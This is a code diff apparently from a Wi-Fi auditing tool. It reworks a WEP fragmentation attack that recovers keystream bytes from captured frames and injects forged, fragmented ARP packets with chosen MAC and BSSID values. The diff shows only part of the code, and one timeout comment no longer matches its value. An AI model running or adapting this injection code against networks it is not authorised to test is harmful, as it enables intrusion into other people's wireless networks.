@@ -373,6 +373,35 @@ int read_packet( void *buf, size_t count )
     return( caplen );
 }
 
+void read_sleep( int usec )
+{
+    struct timeval tv, tv2, tv3;
+    int caplen;
+    fd_set rfds;
+
+    gettimeofday(&tv, NULL);
+    gettimeofday(&tv2, NULL);
+
+    tv3.tv_sec=0;
+    tv3.tv_usec=10000;
+
+    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (usec) )
+    {
+        FD_ZERO( &rfds );
+        FD_SET( dev.fd_in, &rfds );
+
+        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
+        {
+            continue;
+        }
+
+        if( FD_ISSET( dev.fd_in, &rfds ) )
+            caplen = read_packet( h80211, sizeof( h80211 ) );
+
+        gettimeofday(&tv2, NULL);
+    }
+}
+
 
 int filter_packet( unsigned char *h80211, int caplen )
 {
@@ -2698,7 +2727,7 @@ void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, 
 
     //Send
         send_packet(frag, pack_size);
-        usleep(10);
+        if (t<data_size)usleep(10);
 
         if (t>=data_size) break;
     }
@@ -2721,7 +2750,7 @@ int do_attack_fragment()
     uchar prga[4096];
     uchar *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";
     uchar iv[4];
-    uchar ack[14] = "\xd4";
+//    uchar ack[14] = "\xd4";
 
     char strbuf[256];
 
@@ -2755,6 +2784,7 @@ int do_attack_fragment()
     if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
     {
         memset( opt.r_dmac, '\xFF', 6);
+        opt.r_dmac[5] = 0xED;
     }
 
     if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
@@ -2792,17 +2822,20 @@ int do_attack_fragment()
 
         again = RETRY;
 
+        memcpy( packet, packet2, caplen2 );
+        caplen = caplen2;
+        memcpy(prga, packet+28, prga_len);
+        memcpy(iv, packet+24, 4);
+
+        xor_keystream(prga, snap_header, prga_len);
+
         while(again == RETRY)  //sending 7byte fragments
         {
             again = 0;
-            memcpy( packet, packet2, caplen2 );
-            caplen = caplen2;
-            memcpy(prga, packet+28, prga_len);
-            memcpy(iv, packet+24, 4);
 
-            xor_keystream(prga, snap_header, prga_len);
-            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
             arplen=60;
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
+
             if ((round % 2) == 1)
             {
                 printf("Trying a LLC NULL packet\n");
@@ -2812,8 +2845,8 @@ int do_attack_fragment()
 
             printf("Sending fragmented packet\n");
             send_fragments(h80211, arplen, iv, prga, prga_len-4);
-            //Plus an ACK
-            send_packet(ack, 10);
+//            //Plus an ACK
+//            send_packet(ack, 10);
 
             gettimeofday( &tv, NULL );
 
@@ -2858,7 +2891,7 @@ int do_attack_fragment()
                 if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                 {
                     printf( "Got a deauthentication packet!\n" );
-                    sleep( 5 );
+                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                 }
 
                 /* check if we got an disassociation packet */
@@ -2866,11 +2899,11 @@ int do_attack_fragment()
                 if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                 {
                     printf( "Got a disassociation packet!\n" );
-                    sleep( 5 );
+                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                 }
 
                 gettimeofday( &tv2, NULL );
-                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (500*1000) && !gotit) //wait 500ms for an answer
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
                 {
                     printf("No answer, repeating...\n");
                     round++;
@@ -2931,20 +2964,21 @@ int do_attack_fragment()
         {
             again = 0;
 
-            printf("Trying to get 408 bytes of a keystream\n");
+            printf("Trying to get 384 bytes of a keystream\n");
 
-            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
             arplen=408;
+
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
             if ((round % 2) == 1)
             {
                 printf("Trying a LLC NULL packet\n");
-                memset(h80211+24, '\x00', 416);
+                memset(h80211+24, '\x00', arplen+8);
                 arplen+=32;
             }
 
             send_fragments(h80211, arplen, iv, prga, 32);
-            //Plus an ACK
-            send_packet(ack, 10);
+//            //Plus an ACK
+//            send_packet(ack, 10);
 
             gettimeofday( &tv, NULL );
 
@@ -2961,7 +2995,7 @@ int do_attack_fragment()
                         {
                             if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                             {
-                                if (caplen > 400)  //Is short enough
+                                if (caplen > 400 && caplen < 500)  //Is short enough
                                 {
                                     //This is our relayed packet!
                                     printf("Got RELAYED packet!!\n");
@@ -2978,7 +3012,7 @@ int do_attack_fragment()
                 if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                 {
                     printf( "Got a deauthentication packet!\n" );
-                    sleep( 5 );
+                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                 }
 
                 /* check if we got an disassociation packet */
@@ -2986,11 +3020,11 @@ int do_attack_fragment()
                 if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                 {
                     printf( "Got a disassociation packet!\n" );
-                    sleep( 5 );
+                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                 }
 
                 gettimeofday( &tv2, NULL );
-                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (500*1000) && !gotit) //wait 500ms for an answer
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
                 {
                     printf("No answer, repeating...\n");
                     round++;
@@ -3021,8 +3055,8 @@ int do_attack_fragment()
         }
 
         memcpy(iv, packet+24, 4);
-        memcpy(prga, packet+28, 408);
-        xor_keystream(prga, h80211+24, 408);
+        memcpy(prga, packet+28, 384);
+        xor_keystream(prga, h80211+24, 384);
 
         round = 0;
         again = RETRY;
@@ -3042,8 +3076,8 @@ int do_attack_fragment()
             }
 
             send_fragments(h80211, arplen, iv, prga, 300);
-            //Plus an ACK
-            send_packet(ack, 10);
+//            //Plus an ACK
+//            send_packet(ack, 10);
 
             gettimeofday( &tv, NULL );
 
@@ -3077,7 +3111,7 @@ int do_attack_fragment()
                 if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                 {
                     printf( "Got a deauthentication packet!\n" );
-                    sleep( 5 );
+                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                 }
 
                 /* check if we got an disassociation packet */
@@ -3085,18 +3119,18 @@ int do_attack_fragment()
                 if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                 {
                     printf( "Got a disassociation packet!\n" );
-                    sleep( 5 );
+                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                 }
 
                 gettimeofday( &tv2, NULL );
-                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (500*1000) && !gotit) //wait 500ms for an answer
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
                 {
                     printf("No answer, repeating...\n");
                     round++;
                     again = RETRY;
                     if (round > 10)
                     {
-                        printf("Still nothing, quitting with 408 bytes? [y/n] \n");
+                        printf("Still nothing, quitting with 384 bytes? [y/n] \n");
                         fflush( stdout );
                         scanf( "%s", tmpbuf );
                         printf( "\n" );
@@ -3117,7 +3151,7 @@ int do_attack_fragment()
         else length = 1500;
 
         make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
-        if (caplen == length+8)
+        if (caplen == length+8+24)
         {
             //Thats the ARP packet!
             printf("Thats our ARP packet!\n");
